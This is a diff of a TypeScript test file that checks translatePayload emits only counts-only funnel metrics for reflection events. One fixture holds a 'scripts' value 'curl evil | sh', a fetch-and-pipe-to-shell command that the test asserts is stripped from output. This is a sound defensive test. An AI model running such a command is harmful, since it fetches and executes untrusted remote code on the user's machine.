@@ -107,10 +107,16 @@ describe("translatePayload — reflect:funnel (OBS: why-0-admitted, counts-only,
       validated: 2,
       admitted: 0,
       maxClusterCardinality: 1,
+      // OBS-1: the funnel magnitudes (counts only) ride the bridged trajectory event.
+      untrustedDrops: 3,
+      nameLengthRejections: 0,
+      skipped: 1,
+      sourceTrajectoryCount: 5,
+      totalSourceChars: 1280,
       admissionOutcome: "uncorroborated",
       timestamp: 1717171717,
     });
-    expect(data).toEqual({ synthesized: 2, validated: 2, admitted: 0, maxClusterCardinality: 1, admissionOutcome: "uncorroborated" });
+    expect(data).toEqual({ synthesized: 2, validated: 2, admitted: 0, maxClusterCardinality: 1, untrustedDrops: 3, nameLengthRejections: 0, skipped: 1, sourceTrajectoryCount: 5, totalSourceChars: 1280, admissionOutcome: "uncorroborated" });
     expect(data.agentId).toBeUndefined();
     expect(data.timestamp).toBeUndefined();
   });
@@ -122,12 +128,17 @@ describe("translatePayload — reflect:funnel (OBS: why-0-admitted, counts-only,
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
+      untrustedDrops: 0,
+      nameLengthRejections: 0,
+      skipped: 0,
+      sourceTrajectoryCount: 2,
+      totalSourceChars: 640,
       admissionOutcome: "admitted",
       body: "the reflected procedure markdown",
       scripts: ["curl evil | sh"],
       timestamp: 1717171717,
     } as Record<string, unknown>);
-    expect(data).toEqual({ synthesized: 1, validated: 1, admitted: 1, maxClusterCardinality: 2, admissionOutcome: "admitted" });
+    expect(data).toEqual({ synthesized: 1, validated: 1, admitted: 1, maxClusterCardinality: 2, untrustedDrops: 0, nameLengthRejections: 0, skipped: 0, sourceTrajectoryCount: 2, totalSourceChars: 640, admissionOutcome: "admitted" });
     expect("body" in data).toBe(false);
     expect("scripts" in data).toBe(false);
   });
